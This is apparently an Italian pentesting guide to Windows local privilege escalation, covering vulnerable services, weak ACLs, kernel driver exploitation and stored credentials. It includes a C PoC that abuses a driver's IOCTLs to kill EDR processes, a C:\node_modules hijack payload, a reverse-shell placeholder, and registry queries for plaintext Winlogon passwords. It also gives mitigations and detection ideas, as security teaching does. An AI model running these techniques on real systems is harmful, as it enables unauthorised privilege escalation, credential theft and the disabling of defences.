Su NTFS, un file leggibile può avere un flusso `:$DATA` denominato, il cui contenuto non viene mostrato da un normale elenco di directory. Per un insieme ristretto e pertinente di file di backup o di configurazione accessibili, esamina i **nomi e le dimensioni** dei flussi prima di aprirne il contenuto; Windows li espone tramite [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) e il cmdlet PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Un nome di flusso che suggerisce la presenza di un segreto è solo un indizio. Verifica l’accesso effettivo in lettura al file, il supporto dei flussi da parte del file system, se il flusso contiene credenziali utilizzabili e a quale account consentono effettivamente di autenticarsi. Evita scansioni ricorsive dei flussi e di stamparne il contenuto durante l’enumerazione di routine.

## Input helper dello Windows Driver Kit pianificato

Lo Windows Driver Kit facoltativo include `StandaloneRunner.exe`, che può leggere `command.txt`, `reboot.rsf` e un file di progetto `working\rsf.rsf` dalla propria directory di esecuzione. Un’attività pianificata o un servizio che avvia questo helper con un account privilegiato può consentire di eseguire comandi nel contesto di tale account sfruttando l’accesso in scrittura a basso privilegio a questi input, anche quando l’eseguibile dell’helper è protetto. Verifica che il consumer sia privilegiato e che **entrambi** i file ausiliari possano essere creati o modificati; trovare solo l’helper non è sufficiente.

Per un’attività pianificata, esamina la [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) della sua azione e le ACL dei due percorsi dei file ausiliari. Se l’attività non specifica una directory di lavoro, la directory dell’eseguibile è solo un indizio da verificare, non una prova del luogo da cui l’attività legge i propri input. Deve essere soddisfatto anche il requisito del file di lavoro del progetto. Controlla l’effettiva entità di sicurezza dell’attività invece di presumere che venga eseguita come SYSTEM.

## Applicazioni

### Applicazioni installate

Controlla le **autorizzazioni dei binari** (potresti riuscire a sovrascriverne uno ed elevare i privilegi) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Percorso di riparazione dell'agente Windows Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) riguarda le versioni meno recenti degli agenti Windows Checkmk, che scrivevano file di comando in `C:\Windows\Temp` e, se la sostituzione non riusciva, eseguivano un file preesistente protetto dalla scrittura. Il vendor ha risolto il problema nelle versioni 2.1.0p40, 2.2.0p23, 2.3.0b1 e 2.4.0b1. Verifica la versione completa installata e se l'operazione interessata dell'agente può essere eseguita; un'indicazione limitata al ramo, come `2.1`, non basta a stabilire l'esposizione. L'enumerazione può controllare la versione, lo stato del servizio e i permessi di Temp senza creare file né attivare comandi dell'agente.

#### Verifica del servizio SAML di ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) riguardava la build 6210 e le versioni precedenti di ADSelfService Plus; il vendor ha risolto il problema nella build 6211. È rilevante solo se il SAML SSO **è o è stato** abilitato. Una voce relativa al prodotto installato o il percorso di un servizio sono quindi indizi, non una conferma di vulnerabilità: verifica la build esatta, la cronologia della configurazione SAML, la raggiungibilità del servizio dalla rete e l'account con cui viene eseguito. L'esecuzione di codice tramite il servizio eredita i privilegi di quell'account; l'esecuzione come SYSTEM richiede un'istanza eseguita come SYSTEM. Un file `OfflineBackup_*.ezip` leggibile nella directory Backup del prodotto è un indizio separato relativo a un backup crittografato, non una prova di credenziali utilizzabili o di questa vulnerabilità SAML. Durante la normale enumerazione, registra il percorso e i diritti di accesso senza estrarre il contenuto.

#### Controller Jenkins e limiti degli account di dominio

Su un controller Jenkins Windows, distingui il permesso di creare o configurare un job da quello di avviarlo: [Jenkins li documenta come permessi separati `Job/Create`, `Job/Configure` e `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Una pianificazione configurata o un trigger remoto possono offrire un'altra modalità di esecuzione, ma verifica che sia abilitata e che la build venga effettivamente eseguita. L'esecuzione avviene con l'identità del controller o dell'agent selezionato; una credenziale archiviata è utilizzabile solo se il job può accedere al relativo ambito. Esamina separatamente l'accesso ai metadati di `JENKINS_HOME`: Jenkins conserva materiale relativo alle credenziali e chiavi di cifratura in `credentials.xml`, `secrets/hudson.util.Secret` e `secrets/master.key` ([archiviazione dei segreti Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). La loro sola presenza non rivela una password: verifica **l'accesso in lettura ai file necessari** e un percorso distinto di riutilizzo dell'account, senza stampare segreti in output condivisi. Se quell'account dispone di un diritto di scrittura sull'attributo `scriptPath` dell'oggetto utente AD, verifica che il percorso dello script sia scrivibile e che un accesso effettivo o un consumer pianificato lo esegua come utente target prima di considerarlo un'esecuzione tra utenti. Un ulteriore controllo di gruppo richiede la verifica separata dei diritti AD effettivi.

#### Identità dell'agent self-hosted di Azure Pipelines

Per un progetto Azure DevOps Server o Azure Pipelines, distingui il permesso di **creare o modificare** una pipeline da quello di **metterla in coda** e usare il pool di agent selezionato; [Microsoft documenta separatamente i permessi delle pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) e [l'autorizzazione dei pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Se un account con privilegi inferiori può inviare uno script step ed eseguire la pipeline su un agent Windows self-hosted, lo step viene eseguito come [account del sistema operativo configurato per l'agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Prima di dichiarare un passaggio tra utenti o a SYSTEM, verifica la pipeline esatta, le restrizioni su branch e risorse, il pool autorizzato, un job eseguibile e l'identità del servizio agent. Un agent installato, un ruolo di progetto o il solo accesso in scrittura al repository sono soltanto indizi; durante l'enumerazione passiva, esamina i permessi e i metadati locali del servizio senza avviare una build.

#### Credenziali di Microsoft Entra Connect Sync

[Microsoft distingue](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) l'**account del servizio ADSync**, che esegue il servizio di sincronizzazione e accede al database SQL, dall'**account del connettore AD DS**, i cui permessi nella directory dipendono dalle funzionalità di sincronizzazione configurate. Le credenziali del connettore sono archiviate crittografate in quel database, con il materiale delle chiavi [protetto da DPAPI sotto l'account del servizio ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). La sola presenza del servizio di sincronizzazione installato, di un gruppo dal nome che suggerisce privilegi di amministratore locale o la visibilità del database non dimostra che le credenziali siano decifrabili o consentano un'escalation di dominio. Esamina separatamente i diritti effettivi di lettura del database, l'accesso all'account del servizio e alle chiavi, il layout dell'installazione e di SQL, l'identità del connettore configurato e i privilegi AD effettivi di tale identità. La normale enumerazione dovrebbe mostrare solo metadati del servizio e degli accessi, senza interrogare né stampare i segreti archiviati.

#### Permessi delle DLL di supporto dei driver di stampa

Un driver di stampa installato può conservare DLL di supporto in `C:\ProgramData` e caricarle in un processo di stampa con privilegi più elevati. Esamina gli ACL esatti della directory del driver e delle DLL, incluse le directory padre e i reparse point, anche se l'enumerazione WMI delle stampanti è negata. Per il [problema CVE-2019-19363 relativo ai driver di stampa Ricoh](https://www.ricoh.com/info/2020/0122_1), il percorso segnalato era `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [la divulgazione originale](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) descrive il caricamento di DLL da parte di `PrintIsolationHost.exe`. Un ACL scrivibile è solo un indizio: verifica l'effettivo accesso in scrittura dopo aver considerato le voci di negazione, che il driver pertinente sia installato e carichi il file con un'identità privilegiata, e se il driver aggiornato o il programma di sicurezza del vendor abbiano corretto l'installazione. Non dedurre la vulnerabilità dal solo nome della directory o dalla versione del driver.

### Permessi di scrittura

Verifica se puoi modificare un file di configurazione per leggere un file speciale oppure un binario che verrà eseguito da un account Administrator (schedtasks).

Per individuare i permessi deboli su cartelle e file nel sistema, esegui:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistenza/esecuzione tramite caricamento automatico dei plugin di Notepad++

Notepad++ carica automaticamente qualsiasi DLL di plugin presente nelle sue sottocartelle `plugins`. Se è disponibile un'installazione portatile/copia scrivibile, inserire un plugin malevolo consente l'esecuzione automatica di codice all'interno di `notepad++.exe` a ogni avvio (anche da `DllMain` e dai callback dei plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Esegui all'avvio

**Verifica se puoi sovrascrivere voci di registro o file binari che verranno eseguiti da un altro utente.**\
**Leggi** la **pagina seguente** per saperne di più sulle interessanti **posizioni autoruns per l'escalation dei privilegi**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

Cerca driver di terze parti potenzialmente **strani/vulnerabili**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Se un driver espone una primitive arbitraria di lettura/scrittura del kernel (comune nei gestori IOCTL progettati male), puoi ottenere l'escalation sottraendo direttamente un token SYSTEM dalla memoria del kernel.<sup>[[13]](#references)</sup> La tecnica passo passo è descritta qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Per i bug di race condition in cui la chiamata vulnerabile apre un percorso di Object Manager controllato dall'attaccante, rallentare deliberatamente la ricerca (usando componenti con lunghezza massima o catene di directory profonde) può estendere la finestra da microsecondi a decine di microsecondi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF di cancel-safe queue, divulgazioni da paged-pool e pivot tramite I/O ring

Alcune catene LPE del kernel di Windows possono essere costruite combinando due bug singolarmente deboli: una **race condition sulla durata di una cancel-safe queue** che libera una richiesta/CBD mentre il lock della queue è ancora acquisito e una divulgazione **lock-release-before-copy** che espone un'allocazione paged-pool liberata durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Note di audit e sfruttamento:

- **Free-under-lock + cancel afterwards**: cerca un percorso di successo che esegua **Acquire -> CompleteRequest/free -> Release**, mentre il percorso di annullamento esegue **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Se il percorso di successo raggiunge `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` prima di rilasciare il lock di CBDQ/CSQ, un thread bloccato in `NtCancelIoFileEx -> IopCsqCancelRoutine` può riprendere in seguito e passare una `PFLT_CALLBACK_DATA` liberata alla callback di rimozione del driver.
- **Riutilizza l'oggetto queue liberato** con un'allocazione paged-pool della stessa dimensione, controllata dall'attaccante. Le Data Queue Entries di `NPFS` sono utili perché il payload e la dimensione sono controllabili e puoi poi esaminarle con operazioni di lettura/peek delle pipe. Se l'oggetto liberato contiene link a liste, sovrascrivili con un **elenco circolare di nodi di richiesta fittizi nella memoria utente**, in modo che il driver elabori ripetutamente strutture di richiesta definite dall'attaccante invece di fermarsi alla testa della lista originale.
- **Potenzia una scrittura prevedibile**: se la richiesta fittizia reindirizza un puntatore a un contesto annidato usato dalle scritture di bookkeeping (timestamp / QPC / campi adiacenti al refcount), potresti ottenere una scrittura nel kernel **con indirizzo controllabile ma valore non controllabile**. In tal caso, punta al campo **length/size** di un oggetto pool sottoposto a spray anziché a un puntatore finale a codice/dati, quindi esamina gli oggetti dello spray finché quello corrotto non consente una **lettura out-of-bounds da paged-pool**.
- **Schema di divulgazione sfruttabile tramite race condition**: qualsiasi syscall che esegua `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` è un ottimo candidato. L'affidabilità aumenta quando l'attaccante può ampliare il buffer copiato (per esempio aggiungendo molte voci di lista/risorsa che aumentano la dimensione finale dell'allocazione del serializer), perché una copia più lunga estende la finestra di sostituzione senza necessariamente causare il crash della macchina.
- **Target di refill ricchi di puntatori**: gli array di buffer registrati di Windows **I/O ring** sono ottimi target per la divulgazione perché la loro dimensione paged-pool è controllabile dall'attaccante (`8 * regBufferCnt`) e ogni elemento è un puntatore del kernel a un `_IOP_MC_BUFFER_ENTRY`. Fai il leak di uno di questi array, recupera l'`IORING_OBJECT` circostante, poi corrompi **`RegBuffers`** e **`RegBuffersCount`** in modo che le operazioni successive di I/O ring usino voci contraffatte dall'attaccante e forniscano lettura/scrittura arbitraria del kernel. Se l'unica scrittura disponibile produce un byte stabile (per esempio da `KUSER_SHARED_DATA+0x14`), usa **scritture non allineate sovrapposte** per comporre un puntatore utente con byte ripetuti, come `0x0101010101010101`, mappalo con `VirtualAlloc` e inserisci lì l'array di buffer registrati contraffatto.<sup>[[30]](#references)</sup>

Indicatori utili per il debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once ottieni read/write arbitrario del kernel dall’I/O ring corrotto, ruba un token SYSTEM usando il workflow standard post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive di memory corruption degli hive del Registry

Le vulnerabilità moderne degli hive consentono di predisporre layout deterministici, sfruttare discendenti scrivibili di HKLM/HKU e trasformare la corruzione dei metadati in overflow del kernel paged-pool senza un driver personalizzato. Scopri qui l’intera catena:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusione di tipo in modalità diretta di `RtlQueryRegistryValues` tramite percorsi controllati dall’attaccante

Alcuni driver accettano un percorso del Registry dallo userland, verificano solo che sia una stringa UTF-16 valida e poi chiamano `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` verso uno scalare sullo stack come `int readValue`. Se manca `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` viene interpretato in base al tipo **effettivo** del Registry, non a quello previsto dallo sviluppatore.

Questo crea due primitive utili:<sup>[[24]](#references)[[25]](#references)</sup>

- **Deputy confuso / oracle**: un percorso assoluto `\Registry\...` controllato dall’utente consente al driver di interrogare chiavi scelte dall’attaccante, rivelarne l’esistenza tramite codici di ritorno/log e talvolta leggere valori a cui il chiamante non potrebbe accedere direttamente.
- **Corruzione della memoria del kernel**: una destinazione scalare come `&readValue` viene interpretata con un tipo errato come `REG_QWORD`, `UNICODE_STRING` o un buffer binario di dimensione variabile, a seconda del tipo del valore del Registry.

Note pratiche sullo sfruttamento:

- **Mitigazione di Windows 8+**: se la query accede a un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` ma senza `RTL_QUERY_REGISTRY_TYPECHECK`, le chiamate dal kernel causano un crash con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Per mantenere la possibilità di sfruttamento, cerca **chiavi scrivibili dall’attaccante all’interno di hive di sistema trusted** invece di predisporre valori in `HKCU`.
- **Preparazione in un hive trusted**: usa NtObjectManager per enumerare i discendenti scrivibili di `\Registry\Machine` e ripeti la scansione con un token **low-integrity** duplicato per trovare le chiavi raggiungibili da contesti sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: una scrittura diretta di 8 byte in un `int` di 4 byte corrompe i dati adiacenti sullo stack e può sovrascrivere parzialmente un puntatore a callback/funzione nelle vicinanze.
- **`REG_SZ` / `REG_EXPAND_SZ`**: la modalità diretta si aspetta che `EntryContext` punti a una `UNICODE_STRING`. Se il codice carica prima un `REG_DWORD` controllato dall’attaccante in uno scalare sullo stack e poi riutilizza lo stesso buffer per una lettura di stringa, l’attaccante controlla `Length`/`MaximumLength` e influenza parzialmente il puntatore `Buffer`, ottenendo una scrittura kernel parzialmente controllata.
- **`REG_BINARY`**: per dati binari di grandi dimensioni, la modalità diretta tratta il primo `LONG` in `EntryContext` come una dimensione del buffer con segno. Se una precedente lettura `REG_DWORD` lascia un valore **negativo** controllato dall’attaccante nello scalare riutilizzato, la query `REG_BINARY` successiva copia i byte dell’attaccante direttamente negli slot adiacenti sullo stack, spesso fornendo il percorso più semplice per sovrascrivere completamente il puntatore a callback.

Un forte pattern di ricerca: **letture del registro eterogenee nella stessa variabile sullo stack senza reinizializzarla**. Cerca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, puntatori `EntryContext` riutilizzati e percorsi del codice in cui la prima lettura del registro determina se avviene una seconda lettura.

#### Sfruttare l’assenza di FILE_DEVICE_SECURE_OPEN negli oggetti device (LPE + eliminazione di EDR)

Alcuni driver di terze parti firmati creano il proprio oggetto device con un SDDL robusto tramite IoCreateDeviceSecure, ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, la DACL sicura non viene applicata quando il device viene aperto tramite un percorso contenente un componente aggiuntivo, consentendo a qualsiasi utente senza privilegi di ottenere un handle usando un percorso namespace come:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (da un caso reale)

Una volta che un utente può aprire il device, è possibile abusare degli IOCTL privilegiati esposti dal driver per ottenere LPE e manomettere il sistema. Funzionalità osservate in casi reali:
- Restituire handle con accesso completo a processi arbitrari (furto di token / shell SYSTEM tramite DuplicateTokenEx/CreateProcessAsUser).
- Lettura/scrittura raw illimitata del disco (manomissione offline, trucchi per la persistenza all’avvio).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), consentendo di eliminare AV/EDR dallo user land tramite il kernel.

Schema minimo di PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigazioni per gli sviluppatori
- Imposta sempre FILE_DEVICE_SECURE_OPEN quando crei oggetti dispositivo che devono essere limitati da una DACL.
- Convalida il contesto del chiamante per le operazioni privilegiate. Aggiungi controlli PP/PPL prima di consentire la terminazione di processi o la restituzione di handle.
- Limita gli IOCTL (maschere di accesso, METHOD_*, convalida dell’input) e valuta modelli con broker invece di privilegi kernel diretti.

Idee per il rilevamento da parte dei difensori
- Monitora le aperture in user mode di nomi di dispositivo sospetti (ad es., \\ .\\amsdk*) e sequenze di IOCTL specifiche indicative di abuso.
- Applica la blocklist di driver vulnerabili di Microsoft (HVCI/WDAC/Smart App Control) e gestisci liste di autorizzazione e di blocco personalizzate.


## PATH DLL Hijacking

Se disponi di **permessi di scrittura in una cartella presente in PATH**, potresti essere in grado di dirottare una DLL caricata da un processo e **aumentare i privilegi**.<sup>[[2]](#references)</sup>

Controlla i permessi di tutte le cartelle in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Per ulteriori informazioni su come abusare di questo controllo:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking della risoluzione dei moduli Node.js / Electron tramite `C:\node_modules`

Questa è una variante del **percorso di ricerca non controllato di Windows** che interessa le applicazioni **Node.js** ed **Electron** quando eseguono un import semplice come `require("foo")` e il modulo previsto è **assente**.<sup>[[20]](#references)</sup>

Node cerca i pacchetti risalendo l'albero delle directory e controllando le cartelle `node_modules` in ogni directory padre. Su Windows, la ricerca può arrivare alla radice dell'unità, quindi un'applicazione avviata da `C:\Users\Administrator\project\app.js` potrebbe finire per cercare:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se un **utente con privilegi limitati** può creare `C:\node_modules`, può inserire un `foo.js` malevolo (o una cartella del pacchetto) e attendere che un **processo Node/Electron con privilegi superiori** risolva la dipendenza mancante. Il payload viene eseguito nel contesto di sicurezza del processo vittima, quindi si verifica una **LPE** ogni volta che il target viene eseguito come amministratore, da un'attività pianificata con privilegi elevati/wrapper di servizio o da un'app desktop privilegiata avviata automaticamente.

Questo scenario è particolarmente comune quando:

- una dipendenza è dichiarata in `optionalDependencies`<sup>[[22]](#references)</sup>
- una libreria di terze parti racchiude `require("foo")` in un `try/catch` e continua in caso di errore
- un pacchetto è stato rimosso dalle build di produzione, escluso durante il packaging o non è stato installato
- il `require()` vulnerabile si trova in profondità nell'albero delle dipendenze invece che nel codice dell'applicazione principale

### Ricerca di target vulnerabili

Usa **Procmon** per verificare il percorso di risoluzione:<sup>[[23]](#references)</sup>

- Filtra per `Process Name` = eseguibile target (`node.exe`, l'EXE dell'app Electron o il processo wrapper)
- Filtra per `Path` `contains` `node_modules`
- Concentrati su `NAME NOT FOUND` e sull'apertura finale riuscita in `C:\node_modules`

Pattern utili per la code review in file `.asar` decompressi o nel codice sorgente dell'applicazione:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifica il **nome del pacchetto mancante** tramite Procmon o esaminando il codice sorgente.
2. Crea la directory di ricerca nella root, se non esiste già:

```powershell
mkdir C:\node_modules
```

3. Carica un modulo con il nome esatto previsto:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Attiva l'applicazione vittima. Se l'applicazione tenta `require("foo")` e il modulo legittimo non è presente, Node potrebbe caricare `C:\node_modules\foo.js`.

Esempi reali di moduli opzionali mancanti che seguono questo schema includono `bluebird` e `utf-8-validate`, ma la **tecnica** è la parte riutilizzabile: trova un qualsiasi **bare import mancante** che un processo Node/Electron privilegiato su Windows risolverà.

### Idee per il rilevamento e l'hardening

- Genera un avviso quando un utente crea `C:\node_modules` o vi scrive nuovi file o pacchetti `.js`.
- Cerca processi con elevato livello di integrità che leggono da `C:\node_modules\*`.
- Includi tutte le dipendenze runtime in produzione e verifica l'uso di `optionalDependencies`.
- Esamina il codice di terze parti alla ricerca di pattern silenziosi come `try { require("...") } catch {}`.
- Disabilita le verifiche opzionali se la libreria lo consente (ad esempio, alcune distribuzioni di `ws` possono evitare la verifica legacy di `utf-8-validate` con `WS_NO_UTF_8_VALIDATE=1`).

## Rete

### Condivisioni

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Verifica se nel file hosts sono indicati staticamente altri computer noti

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfacce di rete e DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Porte aperte

Verifica la presenza di **servizi con accesso limitato** dall'esterno

```bash
netstat -ano #Opened ports?
```

Per un listener locale, correla il suo PID con il proprietario del processo, il percorso dell’eseguibile e gli eventuali servizi o attività pianificate che lo avviano. Un servizio di controllo remoto può concedere accesso con i privilegi del suo utente desktop solo se i controlli di autenticazione e dei comandi lo consentono. Un’applicazione TCP personalizzata eseguita con un account con privilegi più elevati è un obiettivo di analisi distinto: il listener e il percorso del binario sono indizi passivi, mentre per individuare un percorso autenticato basato su una corruzione della memoria è necessario analizzare quel preciso binario e i dati di input che può raggiungere. Se una porta esposta sembra appartenere a un processo di sistema, confrontala con [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) prima di attribuirla al servizio backend; una regola di inoltro, da sola, non dimostra che la destinazione sia raggiungibile o vulnerabile.

### Tabella di routing

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabella ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Regole del firewall

[**Consulta questa pagina per i comandi relativi al firewall**](../basic-cmd-for-pentesters.md#firewall) **(elencare le regole, creare regole, disattivare, disattivare...)**

Altri[ comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Sottosistema Windows per Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Il binario `bash.exe` si trova anche in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni i privilegi di root, puoi metterti in ascolto su qualsiasi porta (la prima volta che usi `nc.exe` per metterti in ascolto su una porta, una finestra GUI ti chiederà se consentire a `nc` di essere usato dal firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem di `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Essere `root` in Linux all'interno di WSL non conferisce di per sé i diritti di Amministratore di Windows. Se l'identità Windows corrente può leggere il filesystem di una distribuzione, controlla i file della cronologia della shell (incluso `/root/.bash_history`) per individuare comandi che potrebbero aver registrato credenziali; l'escalation richiede comunque un account valido con privilegi superiori e un percorso di autenticazione consentito. La struttura `LocalState\rootfs` si applica alle installazioni WSL più vecchie; WSL 2 archivia comunemente la distribuzione in un [disco virtuale `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), quindi identifica innanzitutto la distribuzione effettiva e il relativo percorso di archiviazione. Evita di stampare i contenuti della cronologia durante l'enumerazione automatizzata.

## Credenziali Windows

### Credenziali Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Considera `DefaultUserName` e `DefaultDomainName` come contesto dell'account, non come credenziali. Un valore `DefaultPassword` o `AltDefaultPassword` non vuoto costituisce un riscontro di password in testo normale nel registro. Se `AutoAdminLogon=1` ma non è possibile leggere alcuna password in testo normale, si tratta solo di un indizio: [Sysinternals Autologon può archiviare la password come segreto LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) e le normali letture del registro non consentono di stabilire se quel segreto esista o sia recuperabile. Prima di segnalare un'esposizione di credenziali, verifica i diritti di accesso e la configurazione di accesso effettiva.

### Gestione credenziali / Windows Vault

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault archivia le credenziali per server, siti web e altri programmi che **Windows** può usare per **accedere automaticamente**. A prima vista, potrebbe sembrare che gli utenti possano archiviare le credenziali per siti come Facebook, Twitter o Gmail e fare in modo che i browser effettuino l'accesso automaticamente, ma non funziona così.

Windows Vault archivia le credenziali che Windows può usare per far accedere automaticamente gli utenti. Ciò significa che qualsiasi **applicazione Windows che richieda credenziali per accedere a una risorsa** (server o sito web) **può utilizzare Gestione credenziali e Windows Vault** e usare le credenziali fornite, invece di chiedere ogni volta agli utenti di inserire nome utente e password.

